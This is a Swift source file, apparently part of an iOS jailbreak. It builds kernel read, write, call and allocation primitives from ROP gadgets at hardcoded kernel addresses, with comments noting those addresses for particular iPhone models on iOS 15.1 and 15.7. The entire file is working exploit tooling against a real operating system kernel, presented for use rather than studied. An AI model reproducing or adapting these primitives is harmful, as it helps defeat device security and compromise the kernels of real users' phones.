
import Foundation

/*
 0xFFFFFFF005BDFAF0
 for kr32
 LDR             X0, [X0,#0x90]
 RET
 */

let kckr32_gadget: UInt64 = 0xFFFFFFF005BDFAF0
let kckw32_gadget: UInt64 = 0xFFFFFFF00733CF2C

/*
 for kw32
 0xFFFFFFF00733CF2C
 STR             W1, [X0,#0x80]
 RET
 */

/*
 for rk32, no krw
 6s 15.1: 0xfffffff006c9b63c
 7  15.7: 0xfffffff006c6a87c
 
 ldr w0, [x2, x1]
 ret
 
 for Serena: 0xfffffff009422a1c
 
 ldr w0, [x1]
 ret
 
 */

/*
 for wk32, no krw
 
 6s, 15.1: 0xfffffff0068f0ccc
 7,  15.7: 0xfffffff0068d8680
 
 str w1, [x2]
 ret
 */



let rk32_static_gadget: UInt64 = 0xfffffff006c6a87c
let wk32_static_gadget: UInt64 = 0xfffffff0068d8680

@_cdecl("kckw32")
func kckw32(virt: UInt64, what: UInt32) {
    kcall_6_nox0 (
        wk32_static_gadget + kernel_slide,
        0, // x0
        UInt64(what), // w1: what
        virt, // x2: where
        0, 0, 0
    )
}

func split(_ value: UInt64) -> (UInt32, UInt32) {
    let lowerBits = UInt32(value & 0xFFFFFFFF)
    let upperBits = UInt32((value >> 32) & 0xFFFFFFFF)
    return (upperBits, lowerBits)
}

func combine(upper: UInt32, lower: UInt32) -> UInt64 {
    let combinedValue: UInt64 = (UInt64(upper) << 32) | UInt64(lower)
    return combinedValue
}

@_cdecl("kckw64")
func kckw64(virt: UInt64, what: UInt64) {
        
    let (upper, lower) = split(what)
    
    kckw32(virt: virt, what: lower)
    kckw32(virt: virt + 0x4, what: upper)
}

@_cdecl("kckr32")
func kckr32(virt: UInt64) -> UInt32 {
    return UInt32(truncatingIfNeeded: kcall_6_nox0(
        rk32_static_gadget + kernel_slide,
        0, // x0
        0, // x1: ldr imm
        virt, // x2: ldr address
        0, 0, 0
    ))
}

@_cdecl("kckr64")
func kckr64(virt: UInt64) -> UInt64 {
    let lower = kckr32(virt: virt)
    let upper = kckr32(virt: virt + 0x4)
        
    let addr = combine(upper: UInt32(truncatingIfNeeded: upper), lower: UInt32(truncatingIfNeeded: lower))
    
    return addr
}

func jbd_kcall(_ addr: UInt64, _ x0: UInt64, _ x1: UInt64, _ x2: UInt64, _ x3: UInt64, _ x4: UInt64, _ x5: UInt64) -> UInt64 {
    kckw64(virt: fake_client + 0x40, what: x0)
    let ret = kcall_6_nox0(addr, x0, x1, x2, x3, x4, x5)
    kckw64(virt: fake_client + 0x40, what: 0)
    return ret
}

var jbd_kernelmap: UInt64 = 0

func jbd_kalloc(_ size: size_t) -> UInt64 {
    let kernel_map = jbd_kernelmap;
    let VM_KERN_MEMORY_BSD: UInt64 = 2
    
    let ret = jbd_kcall(wk32_static_gadget + kernel_slide,
          kernel_map,
          kalloc_scratchbuf,
          UInt64(size),
          UInt64(VM_FLAGS_ANYWHERE),
          VM_KERN_MEMORY_BSD,
          0);
    
    let addr = kckr64(virt: kalloc_scratchbuf)
        
    print("kalloc returned:", String(format: "0x%02llX", addr), String(format: "0x%02X", ret), ret, String(cString: mach_error_string(kern_return_t(ret)))); sleep(1)
    
    kckw64(virt: kalloc_scratchbuf, what: 0)
    
    return addr;
}
